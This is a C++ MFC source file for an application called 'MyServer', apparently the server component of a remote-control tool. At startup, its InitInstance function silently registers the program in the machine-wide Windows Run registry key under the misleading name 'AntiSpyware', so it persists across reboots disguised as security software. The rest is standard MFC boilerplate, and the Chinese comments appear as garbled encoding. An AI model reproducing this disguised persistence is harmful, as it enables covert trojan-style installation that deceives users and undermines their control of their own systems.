// MyServer.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "MyServer.h"
#include "MyServerDlg.h"
#include "comm.h"

#define REGKEY "{E92B03AB-B707-11d2-9CBD-0000F87A3690}"



#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyServerApp

BEGIN_MESSAGE_MAP(CMyServerApp, CWinApp)
	//{{AFX_MSG_MAP(CMyServerApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyServerApp construction







CMyServerApp::CMyServerApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CMyServerApp object

CMyServerApp theApp;                     //ʵ����Ӧ�ó���


/////////////////////////////////////////////////////////////////////////////
// CMyServerApp initialization



BOOL CMyServerApp::InitInstance()
{

		// ����Ĵ����ֹ�����ظ������� //////////////////
		HANDLE hOneInstanceMutex = ::CreateMutex(NULL, FALSE, _T("MyServer_is_Running"));             //���������岻������������ʹ�øö˿ڣ���ֹ�����ظ�����
		if(GetLastError() == ERROR_ALREADY_EXISTS)	
		{	
			hOneInstanceMutex = NULL;
			return FALSE;	
		}
		//////////////////////////////////////////////////

	//д��ע���,���������� 
	HKEY hKey; 
	//�ҵ�ϵͳ�������� 
	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
	//��������Key 
	long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey); 
	if(lRet == ERROR_SUCCESS) 
	{ 
		char pFileName[MAX_PATH] = {0}; 
		//�õ����������ȫ·�� 
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH); 
		//���һ����Key,������ֵ 
		lRet = RegSetValueEx(hKey, "AntiSpyware", 0, REG_SZ, (BYTE *)pFileName, dwRet); 
		//�ر�ע��� 
		RegCloseKey(hKey); 
		if(lRet != ERROR_SUCCESS) 
		{ 
			AfxMessageBox("ϵͳ��������,������ϵͳ����"); 
		} 
	}  


	CMyServerDlg dlg;                             //�������Ի��򴰿�
	m_pMainWnd = &dlg;
	int nResponse = dlg.DoModal();

	//ShowWindow(dlg,SW_HIDE);
	if (nResponse == IDOK)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with OK
	}
	else if (nResponse == IDCANCEL)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with Cancel
	}



	AfxEnableControlContainer();

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif


	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}

